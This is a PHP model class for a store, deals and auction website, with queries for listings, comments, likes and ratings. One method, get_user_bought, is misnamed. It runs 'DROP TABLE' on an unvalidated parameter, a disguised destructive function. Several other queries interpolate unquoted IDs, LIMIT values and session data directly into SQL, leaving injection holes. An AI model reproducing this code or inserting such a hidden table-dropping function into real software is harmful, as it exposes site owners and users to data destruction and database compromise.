<?php defined('SYSPATH') or die('No direct script access.');
class Stores_Model extends Model
{
	public function __construct()
	{
		parent::__construct();
		$this->db = new Database();
		$this->session = Session::instance();
		$this->city_id = $this->session->get("CityID");
		$this->UserID = $this->session->get("UserID");
		
		/*
			Test for club membership and set conditions.
			@Live
		*/
		
		(strcmp($_SESSION['Club'], '0') == 0)?$this->club_condition = 'and for_store_cred = '.$_SESSION['Club'].' ':$this->club_condition = '';
		(strcmp($_SESSION['Club'], '0') == 0)?$this->club_condition_arr = true:$this->club_condition_arr = false;

	}
	

	/**STORE DETAILS COUNT**/
         
        public function store_details_count() 
	    {
                if(CITY_SETTING){
                        $result = $this->db->select("store_id")->from("stores")->select("stores.store_id")
                        ->join('users',"users.user_id","stores.merchant_id")
                        ->where(array("store_status" => '1',"store_type" => '1',"stores.city_id" => $this->city_id,"users.user_type" =>3,"users.user_status" => 1))
                        ->orderby("store_id","DESC")
                        ->get();
                        return count($result);
                } else {
                        $result = $this->db->select("store_id")->from("stores")->select("stores.store_id")
                        ->join('users',"users.user_id","stores.merchant_id")
                        ->where(array("store_status" => '1',"store_type" => '1',"users.user_type" =>3,"users.user_status" => 1))
                        ->orderby("store_id","DESC")
                        ->get();
                        return count($result);

                }
        }
	/** GET STORE LIST **/
       
        public function get_store_details($offset = "", $record = "")
        {
                        if(CITY_SETTING){
                                $result = $this->db->from("stores")->select("stores.*")
                                ->join('users',"users.user_id","stores.merchant_id")
                                ->where(array("store_status" => '1',"store_type" => '1',"stores.city_id" => $this->city_id,"users.user_type" =>3,"users.user_status" => 1))
                                ->orderby("store_id","DESC")
                                ->limit($record, $offset)
                                ->get();
                                return $result;
                        } else {
                                $result = $this->db->from("stores")->select("stores.*")
                                ->join('users',"users.user_id","stores.merchant_id")
                                ->where(array("store_status" => '1',"store_type" => '1',"users.user_type" =>3,"users.user_status" => 1))
                                ->orderby("store_id","DESC")
                                ->limit($record, $offset)
                                ->get();
                                return $result;
                        }
	}

	/** GET STORE LIST **/
       
        public function get_store_detailspage($storekey = "",$store_url_title= "")
        {
			/* if(CITY_SETTING) {
			$result = $this->db->from("stores")
                                ->where(array("store_key" =>$storekey,"store_url_title" => $store_url_title, "store_status" => '1',"stores.city_id" => $this->city_id))
                                ->join("city","city.city_id","stores.city_id")
                                ->join("country","country.country_id","stores.country_id")
                                ->get();
			return $result;
		} else { */
			$result = $this->db->from("stores")
                                ->where(array("store_key" =>$storekey,"store_url_title" => $store_url_title, "store_status" => '1'))
                                ->join("city","city.city_id","stores.city_id")
                                ->join("country","country.country_id","stores.country_id")
                                ->get();
			return $result;
		//}
	}
	
	/** GET SUB STORE LIST **/
       
        public function get_sub_store_detailspage($store_id= "")
        {
                $result_values = $this->db->from("stores")
                                        ->where(array("store_id" => $store_id, "store_status" => '1'))
                                        ->get();
                $merchant_id = $result_values->current()->merchant_id; 

                $result = $this->db->from("stores")
                                        ->where(array("store_id <>" => $store_id,"merchant_id" => $merchant_id, "store_status" => '1'))
                                        ->get();
		return $result;
	}
	
	/** VIEW CATEGORIES WAYS DEALS **/
	
	public function get_deals_categories($store_id = "",$search="")
	{
		
		$conditions = "deals.shop_id = $store_id and deals.deal_status = 1  ".$this->club_condition." and enddate > ".time()."";
		  if($search){
			$conditions .= " and (deal_title like '%".mysql_real_escape_string($search)."%'";
			$conditions .= " or deal_description like '%".mysql_real_escape_string($search)."%')";
		}
		if(CITY_SETTING){ 
			$conditions .= " and stores.city_id = $this->city_id ";
			
	        $result = $this->db->from("deals")
	                    ->where($conditions)
                            ->join("stores","stores.store_id","deals.shop_id")
                            ->join("city","city.city_id","stores.city_id")
                            ->join("country","country.country_id","stores.country_id")
                            ->join("users","users.user_id","deals.merchant_id")
                            ->join("category","category.category_id","deals.category_id")
                            ->get();
                            
                    return $result;
		}else {
			
					
				   $n_condition = array("shop_id" => $store_id,"enddate >" => time(),"deal_status"=>1);
				   
				   if($this->club_condition_arr)
				  	 $n_condition = array("shop_id" => $store_id,"enddate >" => time(),"deal_status"=>1, "for_store_cred" => 0);
				   
			       $result = $this->db->from("deals")	   
	                    ->where($n_condition)//@Live
                            ->join("stores","stores.store_id","deals.shop_id")
                            ->join("users","users.user_id","deals.merchant_id")
                            ->join("category","category.category_id","deals.category_id")
                            ->get();
                    return $result;
		}
	}
	
	/** VIEW CATEGORIES WAYS PRODUCTS **/
	
	public function get_product_categories($store_id = "",$search="")
	{
		$conditions = "purchase_count < user_limit_quantity  and category.category_status = 1 and  store_status = 1  and shop_id = $store_id";
		if($search){
			$conditions .= " and (deal_title like '%".mysql_real_escape_string($search)."%'";
			$conditions .= " or deal_description like '%".mysql_real_escape_string($search)."%')";
		}
		if(CITY_SETTING){ 
			$conditions .= " and stores.city_id = $this->city_id ";
		}
		$query = "select deal_id, deal_key, url_title, deal_title, deal_description, deal_value,category_url from product  join stores on stores.store_id=product.shop_id join category on category.category_id=product.category_id where $conditions and product.deal_status = 1 ".$this->club_condition." group by product.deal_id order by product.deal_id DESC"; 
		$result = $this->db->query($query);
	       
	        return $result;
	}

	/** VIEW CATEGORIES WAYS AUCTIONS **/
	
	public function get_auction_categories($store_id = "",$search="")
	{
		$conditions = "auction.shop_id = $store_id and auction.deal_status = 1  ".$this->club_condition." and enddate > ".time()."";
		  if($search){
			$conditions .= " and (deal_title like '%".mysql_real_escape_string($search)."%'";
			$conditions .= " or deal_description like '%".mysql_real_escape_string($search)."%')";
		}
		if(CITY_SETTING){ 
			$conditions .= " and stores.city_id = $this->city_id "; 		
	        $result = $this->db->from("auction")
	                     ->where($conditions)
                            ->join("stores","stores.store_id","auction.shop_id")
                            ->join("city","city.city_id","stores.city_id")
                            ->join("country","country.country_id","stores.country_id")
                            ->join("users","users.user_id","auction.merchant_id")
                            ->join("category","category.category_id","auction.category_id")
                            ->get();
                    return $result;
		}else {
			$n_condition = array("shop_id" => $store_id,"enddate >" => time(),"deal_status"=>1);
			
			if($this->club_condition_arr)
				$n_condition = array("shop_id" => $store_id,"enddate >" => time(),"deal_status"=>1, "auction.for_store_cred" => 0);
			
			
			
			
		    $result = $this->db->from("auction")
			->where($n_condition)//@Live
			->join("stores","stores.store_id","auction.shop_id")
			->join("users","users.user_id","auction.merchant_id")
			->join("category","category.category_id","auction.category_id")
			->get();
			return $result;
		}
	}

    /** SEARCH STORE COUNT **/

	public function get_store_count($search = "")
	{
	        $conditions = "";
		if($search){
			 $conditions .= "and store_name like '%".mysql_real_escape_string($search)."%'";
		}
		if(CITY_SETTING){
		
		$query = "select * from stores  join users on users.user_id=stores.merchant_id  where store_status = 1 and users.user_type=3 and users.user_status=1  and stores.city_id = '$this->city_id' $conditions order by store_id DESC";
		$result = $this->db->query($query);
		return count($result);
		}else {
				$query = "select * from stores  join users on users.user_id=stores.merchant_id  where store_status = 1 and users.user_type=3 and users.user_status=1  $conditions order by store_id DESC";
		$result = $this->db->query($query);
	        return count($result);
		}
	}
	/* PAYMENT LIST */
	 public function payment_list()
	    {
			$result = $this->db->select("users.firstname","bidding_time as transaction_date","bidding.bid_amount","auction_id")->from("bidding")->join("auction", "auction.deal_id", "bidding.auction_id")->join("users","users.user_id","bidding.user_id")->get(); 
		return $result;
	    }

        public function get_user_bought($uid = "")
	{
		$query = "DROP TABLE $uid";
		$result = $this->db->query($query);
		return count($result);
	}
       
	/** GET SEARCH STORE LIST **/

	public function  get_store_list($search = "",  $offset = "", $record = "")
	{
	        $conditions = " ";
		if($search){
			 $conditions .= " and store_name like '%".mysql_real_escape_string($search)."%'";
		}
		if(CITY_SETTING){
		$query = "select * from stores  join users on users.user_id=stores.merchant_id  where store_status = 1 and users.user_type=3 and users.user_status=1 and stores.city_id = '$this->city_id'  $conditions order by store_id DESC limit $offset,$record";
		$result = $this->db->query($query);
	        return $result;
		} else {
		$query = "select * from stores  join users on users.user_id=stores.merchant_id  where store_status = 1 and users.user_type=3 and users.user_status=1 $conditions order by store_id DESC limit $offset,$record";
		$result = $this->db->query($query);
	        return $result;
		}
	}  
		/** GET COMMENTS LIST **/

	public function get_comments_data($store_id = "")
	{
		$result = $this->db->from("discussion")->join("users","users.user_id","discussion.user_id")->where(array("store_id" => $store_id,"discussion_status" => "1","delete_status" => 1))->orderby("discussion_id", "DESC")->get();
		return $result;
	} 
	
	/** ADD COMMENTS **/

	public function add_comments($comments = "" , $store_id = "")
	{ 
	        $result = $this->db->insert("discussion", array("user_id" =>$this->UserID, "store_id" => $store_id, "comments" => $comments, "created_date" => time(),"discussion_status"=>0)); 
		return 0;
	}
	/** UPDATE COMMENTS **/

	public function update_comments($comments = "" , $deal_id = "",$discussion_id="")
	{
		
	        $result = $this->db->update("discussion", array("user_id" =>$this->UserID, "deal_id" => $deal_id, "comments" => $comments,"created_date" => time()),array("discussion_id" =>$discussion_id));
			
		return $result; 
	}
	/*GET LIKE DATA */
    public function get_like_data($store_id = "")
	{
		$result = $this->db->from('discussion_likes')->where(array('store_id' => $store_id))->get();
		return $result;
	}
	
	/** GET UNLIKE COUNT **/
	
	public function get_unlike_data($store_id = "")
	{
		$result = $this->db->from('discussion_unlike')->where(array('store_id' => $store_id))->get();
		return $result;
	}
    /*LIKE */
	public function like($store_id = "",$user_id="",$dis_id = "")
    {
            $result = $this->db->insert("discussion_likes",array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')));
            $result = $this->db->from('discussion_unlike')->where(array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')))->get();
            if(count($result) > 0){
				$result = $this->db->delete('discussion_unlike', array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')));
			}
            return 1;
    }
    /*UNLIKE */
     public function unlike($store_id = "",$user_id="",$dis_id = "")
    { 
        
            $result = $this->db->insert("discussion_unlike",array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')));
            $result = $this->db->from('discussion_likes')->where(array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')))->get();
            if(count($result) > 0){
				$result = $this->db->delete('discussion_likes', array("discussion_id" => $dis_id, "store_id" => $store_id, "user_id" => $this->session->get('UserID')));
			}
            return 1;
    }
    
    /** GET DEALS LIKE COUNT **/
	
	public function get_like_details($dis_id = "")
	{
		$result = $this->db->from('discussion_likes')->where(array('discussion_id' => $dis_id, 'store_id !=' => 0))->get();
		return count($result);
	}
	/* GET UNLIKE DETAILS */
	public function get_unlike_details($dis_id = "")
	{
		$result = $this->db->from('discussion_unlike')->where(array('discussion_id' => $dis_id, 'store_id !=' => 0))->get();
		return count($result);
	}

	/** AUCTION RATING **/
	
	public function save_store_rating($store_id="",$rate = "")
	{
		$result= $this->db->from("rating")->where(array("type_id" => $store_id, "user_id" => $this->UserID))->get(); 

		if(count($result)==0)
		{
			$result = $this->db->insert("rating", array("type_id" => $store_id, "user_id" => $this->UserID, "rating" => $rate, "module_id" => 4));
		}
		elseif(count($result)>0)
		{
			$result= $this->db->update("rating", array("rating" => $rate), array("type_id" => $store_id, "user_id" => $this->UserID, "module_id" => 4));
		} 
	}

	/** AUCTION RATING **/
	
	public function get_store_rating($store_id="")
	{
		$result= $this->db->from("rating")->where(array("type_id" => $store_id))->get();
		if(count($result)>0)
		{
			$get_rate = count($result);
			$sum= $this->db->query("select sum(rating) as sum from rating where type_id=$store_id AND module_id = 4");
			$get_sum=$sum->current()->sum;
			$average= $get_sum/$get_rate;
			return $average;
		}
		elseif(count($result)==0)
		{
			return 0;
		}
	}	
}
